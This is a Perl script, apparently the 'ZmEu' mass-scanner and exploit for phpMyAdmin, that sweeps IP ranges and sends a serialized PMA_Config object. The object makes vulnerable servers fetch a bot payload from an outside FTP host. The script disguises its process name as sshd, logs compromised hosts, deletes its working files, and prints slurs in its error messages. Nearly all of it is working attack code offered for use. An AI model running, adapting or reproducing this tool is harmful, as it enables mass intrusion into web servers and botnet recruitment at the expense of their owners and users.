#!/usr/bin/perl 

# MODULES

#use warnings;
use Parallel::ForkManager;
use IO::Socket;
use URI::_foreign;
use URI::_generic;
use URI::_query;
require URI::_foreign;
use URI;
use LWP;
use LWP::Simple;
use LWP::UserAgent;
use LWP::Protocol::http;
use URI::http;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Headers;
use HTML::Parser;
use Parallel::ForkManager;
use IO::Socket;
use LWP::Simple;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Headers;
use Getopt::Long;
use Time::HiRes qw(gettimeofday);
use MIME::Base64;

#use strict;
my $ua = LWP::UserAgent->new(agent => "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]", env_proxy => 1, keep_alive => 1,timeout => 20);
my $hostfile="$ARGV[0]";
my $word=".dsf";
my $maximumprocess="100";
my $hiddenprocess='/usr/sbin/sshd                                                                                                              ';
my $eth="venet0:0";
my $spd='9';
my $scanclassb;
my $scanclassa;
my $explhost;
my $explpayhost;
my $explpayloadfile;

GetOptions(
	'exploit|x' => \&exploit,
        'h|hostfile=s'    => \$hostfile,
        'p|paths=s' => \$word,
        't|threads=s'      => \$maximumprocess,
        'help'        => \&usage,
        'hide=s'                => \$hiddenprocess,
        'b=s'           => \$scanclassb,
        'a=s'           => \$scanclassa,
        'i=s'           => \$eth,
        'spd=s'         => \$spd,
        'r'             => \&rev,
	'host=s'	=> \$explpayhost,
	'clean|sterge' => \&sterge,
);

$0="$hiddenprocess";

sub rev {
our $reverse='on';

}
if ($explhost) {
shell("$explhost");
}
elsif ($scanclassb) {
scanb("$scanclassb","$eth","$spd","$reverse");
}
elsif ($scanclassa) {
scana("$scanclassa","$eth","$spd","$reverse");
}
elsif (($explpayloadfile) && $explpayhost) {
payload_exec("$explpayhost","$explpayloadfile");
}

if ( !-e $word ) {
        die "\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mCRITICAL! Paths file does not seem to exist faggot: $word\e[0m\n";

}

if ( !-e $hostfile ) {
        die "\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mCRITICAL! Host file does not seem to exist dumbfuck: $hostfile\e[0m\n";

}

sub usage {
print ("\e[37;1m[\e[32;1m+\e[37;1m] \e[1;31;1mSyntax: $0 .. READ THE DAMN MANUAL=]\e[0m\n\n");
exit;
}

sub exploit {
my $total = `grep -c . $hostfile`;
chomp($total);
my $curhost = 0;
my $forkmanager = new Parallel::ForkManager($maximumprocess);
open(my $hostfileh, "<" . $hostfile);
while (<$hostfileh>) {
my $host = $_;
$host =~ s/\x0a//g;
chomp($host);
$curhost = $curhost + 1;
chomp($curhost);
print qq (\e[0;32m[\e[1;33m+\e[0;32m]\e[0;31mDEAD IP\e[1;33m -> \e[0;32m$host \e[0;31m[\e[0;31m$curhost \e[1;33mof \e[0;32m$total\e[0;32m]\e[0;32m\n);
open(my $wordh, "<" . $word);
while (<$wordh>) {
my $path = $_;
$path =~ s/\x0a//g;
chomp($path);
my $processid = $forkmanager->start() and next;
my $ua = LWP::UserAgent->new(agent => "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]", env_proxy => 1, keep_alive => 1,timeout => 20);
my $url = $host;
my $ftp = "ftp://192.99.145.85/bot.php";
my $len = length($ftp);
my $code = "a:1:\{i:0\;O:10:\"PMA_Config\":1:\{s:6:\"source\"\;s:" . $len . ":\"". $ftp ."\"\;\}\}";
$code =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
my $cookie = HTTP::Cookies->new;
my $token;
my $req = HTTP::Request->new("GET", $url);
my $res = $ua->request($req);
if ($res->is_success) {
$join = join("",$res->as_string);
if ($token=$join=~m#name="token" value="(.+?)"#sg) {
$token = $1;
}
else {
#print ("[=]fix pula");
}
}
$cookie->extract_cookies($res);
$attempt = "action=lay_navigation&eoltype=unix&token=" . $token . "&configuration=" . $code;
$req = HTTP::Request->new("POST", $url);
$cookie->add_cookie_header($req);
$req->header(Referer => $url);
$req->content_type('application/x-www-form-urlencoded');
$req->content($attempt);
$res = $ua->request($req);
my $data = $res->as_string;
#print $data;
#if ( $data =~ m#zmeu_start(.+?)zmeu_end#sg )
if ( $data =~ m#500(.+?)#sg )
{
open(OUT, ">>.session.log");
print OUT ("$host\n");
close OUT;
print("\e[1;33m[\e[0;31m+\e[1;33m]\e[0;32mVulnerable\e[0;31;33m -> $host \e[0m\n");
}
$forkmanager->finish();
}
close($wordh);
}
close($hostfileh);
$forkmanager->wait_all_children();
}

sub scana {
my $classa=$_[0];
my $interface=$_[1];
my $speed=$_[2];
my $reverse=$_[3];
print ("[=]pma massscan by ZmEu of #blackhats @ Foonet\n[=]Greetz to everyone i know release date: 18/02/2011\nReverse ip mode: $reverse\n");
system("rm -f bios.txt ips.txt urls.txt urlz.txt vuln.txt");
system("./ss 80 -a $classa -i $interface -s $speed");
system("sort -u bios.txt > ips.txt");
system("./bing ips.txt");
system("sort -u urls.txt > urlz.txt");
system("./zmeu urlz.txt vuln.txt cgi $maximumprocess");
#if ($reverse eq "on") {
#&startrev();
#exit;
#}
#else {
&exploit();
exit;
#}
#exit;
}

sub scanb {
my $classb=$_[0];
my $interface=$_[1];
my $speed=$_[2];
my $reverse=$_[3];
print ("[=]PMA Exploit by Colocation\n[=]\nReverse ip mode: $reverse\n");
system("rm -f bios.txt ips.txt urls.txt urlz.txt vuln.txt");
system("./ss 80 -b $classb -i $interface -s $speed");
system("sort -u bios.txt > ips.txt");
system("./bing ips.txt");
system("sort -u urls.txt > urlz.txt");
system("./zmeu urlz.txt vuln.txt cgi $maximumprocess");
#if ($reverse eq "on") {
#&startrev();
#exit;
#}
#else {
&exploit();
exit;
#}
#exit;
}

sub sterge {
system("rm -f *.txt");
exit;
}
